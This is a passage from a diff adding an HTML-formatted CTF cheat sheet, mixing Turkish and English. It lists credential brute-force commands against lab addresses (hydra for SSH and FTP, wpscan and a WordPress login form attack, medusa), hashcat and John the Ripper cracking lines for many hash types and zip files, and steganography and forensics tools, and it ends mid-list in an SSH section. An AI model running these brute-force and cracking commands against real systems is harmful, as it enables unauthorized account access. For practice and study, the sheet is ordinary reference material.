+font-family:"Times New Roman",serif;color:#00B0F0'> 10.0.2.15 </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>http-post-form ‘/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=log+In:F=Invalid
+username</span><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>’</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'> <o:p></o:p></span></p>
+
+<p class=MsoNormal style='border:none;mso-border-bottom-alt:solid windowtext .75pt;
+padding:0cm;mso-padding-alt:0cm 0cm 1.0pt 0cm'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p>&nbsp;</o:p></span></p>
+
+</div>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt;mso-list:l24 level1 lfo9'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B0F0'><span
+style='mso-list:Ignore'>2)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>wpscan –url &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>ip</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt; --passwords &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>wordlist</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt; --usernames &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>username</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:yellow'>Ör: </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>wpscan –url 10.0.2.15 –passwords worlist.txt –usernames jelly<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#FFC000'>For SSH<o:p></o:p></span></b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt;mso-list:l10 level1 lfo37'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B0F0'><span
+style='mso-list:Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>hydra -l &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>username</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt; -P &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>wordlis.txt</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>&gt; ssh://</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>ip</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:yellow'>Ör/ </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>hydra -l jan -P fasttrack.txt ssh://10.10.38.56<o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#FFC000'>for FTP<o:p></o:p></span></b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt;mso-list:l43 level1 lfo38'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B0F0'><span
+style='mso-list:Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>hydra -l &lt;ftpuser&gt; -P &lt;rockyou.txt&gt;
+<span style='mso-spacerun:yes'> </span>&lt;</span><a href="ftp://10"><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif'>10</span></a><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>.10.15.14&gt; ftp<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:yellow'>http basic auth bruteforce<o:p></o:p></span></b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt;mso-list:l30 level1 lfo40'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B0F0'><span
+style='mso-list:Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>medusa -h &lt;192.168.1.1&gt; -U
+</span><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>/opt/CTF/rockyou.txt </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>-P </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>/opt/CTF/rockyou.txt </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>-M http -F<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:36.0pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>-U </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>ile denenecek kullanıcı adları verilir.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:36.0pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>-P </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>ile denenecek parolalar verilir.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:36.0pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>-M </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>ile saldırının yapılacağı metot seçilir.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:36.0pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>-F </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>ile başarılı loginde saldırının durdurulması seçilir.<o:p></o:p></span></p>
+
+
+				</pre>
+				
+			</div>
+
+			<div id="C4">
+				<h1 id="hash" align=center style='text-align:center; color: darkgreen;'>HASH</h1>
+				<pre>
+					<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt;mso-list:l40 level1 lfo42'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B0F0;mso-bidi-font-weight:
+bold'><span style='mso-list:Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:#00B0F0'>hash analyzer<o:p></o:p></span></b></p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt;mso-list:l40 level1 lfo42'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B0F0;mso-bidi-font-weight:
+bold'><span style='mso-list:Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:#00B0F0'>hash-identifier<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>findmyhash </span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&lt;MD5&gt; -h &quot;hash&quot; -g: google'da hash ile ilgili arama
+yapar<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>MD4= </span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>hashcat -m 900 </span></b><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>hash1_1.txt
+</span></b><b><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>rockyou.txt<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#FFC000'><span style='mso-tab-count:
+1'>            </span></span></b><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>john -format=raw-</span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>md4 </span></b><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>--wordlist=</span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>rockyou.txt hash1_2.txt<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>MD5= </span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>hashcat -m 0 </span></b><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:#00B0F0'>hash1_1.txt </span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>rockyou.txt<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#FFC000'><span style='mso-tab-count:
+1'>            </span></span></b><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>john -format=raw-</span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>md5 </span></b><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>--wordlist=</span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>rockyou.txt hash1_2.txt<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>SHA1= </span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>hashcat -m 100 </span></b><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>hash1_2.txt
+</span></b><b><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>rockyou.txt<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#FFC000'><span style='mso-tab-count:
+1'>            </span></span></b><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>john -format=raw-</span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>sha1 </span></b><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>--wordlist=</span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>rockyou.txt hash1_2.txt<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>SHA256= </span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>hashcat -m 1400 </span></b><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>hash1_1.txt
+</span></b><b><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>rockyou.txt<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#FFC000'><span style='mso-tab-count:
+1'>            </span></span></b><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>john -format=raw-</span></b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif'> <b><span
+style='color:#FFC000'>sha256 </span><span style='color:red'>--wordlist=</span><span
+style='color:#FFC000'>rockyou.txt hash1_2.txt<o:p></o:p></span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>SHA512= </span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>hashcat -m 1800 </span></b><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>hash1_1.txt
+</span></b><b><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>rockyou.txt<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#FFC000'><span style='mso-tab-count:
+1'>            </span></span></b><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>john -format=raw-</span></b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif'> <b><span
+style='color:#FFC000'>sha512 </span><span style='color:red'>--wordlist=</span><span
+style='color:#FFC000'>rockyou.txt hash1_2.txt<o:p></o:p></span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>BCRYPT= </span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>hashcat -m 3200 </span></b><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>hash1_2.txt
+</span></b><b><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>rockyou.txt<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#FFC000'><span style='mso-tab-count:
+1'>            </span></span></b><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>john -format=raw-</span></b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif'> <b><span
+style='color:#FFC000'>bcrypt </span><span style='color:red'>--wordlist=</span><span
+style='color:#FFC000'>rockyou.txt hash1_2.txt<o:p></o:p></span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>NTLM= </span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>hashcat -m 1000 </span></b><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>hash1_1.txt
+</span></b><b><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>rockyou.txt<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#FFC000'><span style='mso-tab-count:
+1'>            </span></span></b><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>john -format=raw-</span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>nt </span></b><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>--wordlist=</span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>rockyou.txt hash1_2.txt<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'>HMAC-SHA1= </span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>hashcat -m 160 </span></b><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>hash1_2.txt
+</span></b><b><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>rockyou.txt<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#FFC000'>Zip:<o:p></o:p></span></b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt;mso-list:l17 level1 lfo39'><![if !supportLists]><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B0F0'><span
+style='mso-list:Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span></b><![endif]><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:#00B050'>HashAl: </span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>zip2john zipname.zip </span></b><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B050'>&gt; </span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#FFC000'>output.txt</span></b><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B050'><o:p></o:p></span></b></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B050'>BruteForce:
+</span></b><b><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>john </span></b><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#FFC000'>output.txt <o:p></o:p></span></b></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#FFC000'>Or<o:p></o:p></span></b></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#FFC000'>johny<o:p></o:p></span></b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt;mso-list:l17 level1 lfo39'><![if !supportLists]><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B0F0'><span
+style='mso-list:Ignore'>2)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span></b><![endif]><b><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>fcrackzip -u -D -p</span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'> /opt/CTF/rockyou.txt </span></b><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:yellow'>zipName.zip</span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'><o:p></o:p></span></b></p>
+				</pre>
+			</div>
+
+			<div id="C5">
+				<h1 id="analyzer" align=center style='text-align:center; color: red;'>Analyzer</h1>
+				<pre>
+					<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt;mso-list:l14 level1 lfo10'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red'><span style='mso-list:
+Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>exiftool</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> image.png<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l14 level1 lfo10'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red'><span style='mso-list:
+Ignore'>2)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>xxd</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> image.png | </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>grep</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> -i flag<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l14 level1 lfo10'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red'><span style='mso-list:
+Ignore'>3)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>steghide info </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>index.jpeg<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:#00B0F0'>steghide extract -sf </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>index.jpeg<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l14 level1 lfo10'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red'><span style='mso-list:
+Ignore'>4)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>binwalk -e </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>index.png<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l14 level1 lfo10'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red'><span style='mso-list:
+Ignore'>5)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>ettercap -T -r </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>sus.pcapng<span style='mso-tab-count:2'>                   </span>//pcapng
+analiz<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt;mso-list:l14 level1 lfo10'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red'><span style='mso-list:
+Ignore'>6)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>search Google &lt;image&gt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p></o:p></span></p>
+				</pre>
+			</div>
+
+
+			<div id="C6">
+				<h1 id="connect" align=center style='text-align:center; color: green;'>Connect</h1>
+				<pre>
+					<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>For ssh<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='margin-left:53.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l35 level1 lfo13'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>ssh</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> &lt;username</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>@</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>domainname&gt; </span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:#00B0F0'>-p</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> &lt;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>port</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&gt;<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:53.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l35 level1 lfo13'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>2)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>ssh -i </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>sshkey.private username</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>@</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>localhost<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:53.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l35 level1 lfo13'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>3)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>ssh</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> </span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>-t </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>user</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>@</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>domain </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>-p </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>2220 '/bin/sh'<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='margin-left:53.4pt;mso-add-space:auto;
+text-indent:-18.0pt;mso-list:l35 level1 lfo13'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>4)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
